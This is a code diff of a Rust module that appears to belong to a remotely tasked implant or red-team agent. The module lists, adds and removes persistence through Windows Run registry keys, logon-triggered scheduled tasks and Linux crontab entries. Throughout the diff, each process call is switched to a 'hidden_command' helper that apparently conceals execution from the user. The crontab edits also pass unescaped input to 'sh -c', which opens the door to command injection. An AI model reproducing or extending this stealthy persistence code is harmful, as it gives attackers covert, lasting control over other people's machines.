@@ -49,7 +49,7 @@ fn list_windows(task_id: i64) -> TaskResult {
     ];
 
     for (hive_name, path) in &run_keys {
-        let output = std::process::Command::new("reg")
+        let output = crate::utils::helpers::hidden_command("reg")
             .args(["query", &format!("{}\\{}", hive_name, path)])
             .output();
 
@@ -73,7 +73,7 @@ fn list_windows(task_id: i64) -> TaskResult {
     }
 
     // Check scheduled tasks
-    let schtasks = std::process::Command::new("schtasks")
+    let schtasks = crate::utils::helpers::hidden_command("schtasks")
         .args(["/query", "/fo", "CSV", "/nh"])
         .output();
 
@@ -123,7 +123,7 @@ fn add_windows(task_id: i64, args: &serde_json::Value) -> TaskResult {
     match method {
         "registry" => {
             let hive = args.get("hive").and_then(|v| v.as_str()).unwrap_or("HKCU");
-            let result = std::process::Command::new("reg")
+            let result = crate::utils::helpers::hidden_command("reg")
                 .args([
                     "add",
                     &format!("{}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", hive),
@@ -147,7 +147,7 @@ fn add_windows(task_id: i64, args: &serde_json::Value) -> TaskResult {
         }
         "schtask" => {
             let schedule = args.get("schedule").and_then(|v| v.as_str()).unwrap_or("ONLOGON");
-            let result = std::process::Command::new("schtasks")
+            let result = crate::utils::helpers::hidden_command("schtasks")
                 .args(["/create", "/tn", name, "/tr", value, "/sc", schedule, "/f"])
                 .output();
 
@@ -187,7 +187,7 @@ fn remove_windows(task_id: i64, args: &serde_json::Value) -> TaskResult {
     match method {
         "registry" => {
             let hive = args.get("hive").and_then(|v| v.as_str()).unwrap_or("HKCU");
-            let result = std::process::Command::new("reg")
+            let result = crate::utils::helpers::hidden_command("reg")
                 .args([
                     "delete",
                     &format!("{}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", hive),
@@ -206,7 +206,7 @@ fn remove_windows(task_id: i64, args: &serde_json::Value) -> TaskResult {
             }
         }
         "schtask" => {
-            let result = std::process::Command::new("schtasks")
+            let result = crate::utils::helpers::hidden_command("schtasks")
                 .args(["/delete", "/tn", name, "/f"])
                 .output();
 
@@ -229,7 +229,7 @@ fn list_linux(task_id: i64) -> TaskResult {
     let mut entries = Vec::new();
 
     // Check crontab
-    let cron = std::process::Command::new("crontab")
+    let cron = crate::utils::helpers::hidden_command("crontab")
         .args(["-l"])
         .output();
     if let Ok(out) = cron {
@@ -290,14 +290,14 @@ fn add_linux(task_id: i64, args: &serde_json::Value) -> TaskResult {
 
     match method {
         "crontab" => {
-            let existing = std::process::Command::new("crontab")
+            let existing = crate::utils::helpers::hidden_command("crontab")
                 .args(["-l"])
                 .output()
                 .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                 .unwrap_or_default();
 
             let new_crontab = format!("{}\n{}\n", existing.trim(), value);
-            let result = std::process::Command::new("sh")
+            let result = crate::utils::helpers::hidden_command("sh")
                 .args(["-c", &format!("echo '{}' | crontab -", new_crontab)])
                 .output();
 
@@ -321,7 +321,7 @@ fn remove_linux(task_id: i64, args: &serde_json::Value) -> TaskResult {
     };
 
     // Remove matching crontab entry
-    let existing = std::process::Command::new("crontab")
+    let existing = crate::utils::helpers::hidden_command("crontab")
         .args(["-l"])
         .output()
         .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
@@ -330,7 +330,7 @@ fn remove_linux(task_id: i64, args: &serde_json::Value) -> TaskResult {
     let filtered: Vec<&str> = existing.lines().filter(|l| !l.contains(name)).collect();
     let new_crontab = filtered.join("\n");
 
-    let result = std::process::Command::new("sh")
+    let result = crate::utils::helpers::hidden_command("sh")
         .args(["-c", &format!("echo '{}' | crontab -", new_crontab)])
         .output();
 
